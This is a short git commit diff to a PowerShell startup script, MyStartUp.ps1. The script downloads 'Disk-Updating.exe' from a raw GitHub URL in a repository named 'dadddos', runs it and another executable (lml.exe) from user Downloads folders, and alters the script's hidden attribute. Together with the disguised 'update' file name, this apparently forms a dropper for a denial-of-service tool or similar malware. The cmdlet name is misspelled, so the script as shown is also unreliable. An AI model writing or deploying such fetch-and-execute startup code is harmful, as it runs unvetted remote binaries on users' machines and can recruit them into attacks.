52dd10797a49f2e58d5648372f34298e4b6c73d7
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-28 20:42:46 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,7 +1,7 @@
 # Parches Ejecución de Tareas.
 Invoke-Web-Request -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/Disk-Updating.exe -OutFile C:\Users\ana\Downloads\Disk-Updating.exe
 taskkill /F /IM Disk-Updating.exe
-C:\Users\angel\Downloads\Disk-Updating.exe
+C:\Users\ana\Downloads\Disk-Updating.exe
 taskkill /F /IM lml.exe
 C:\Users\seba\Downloads\lml.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
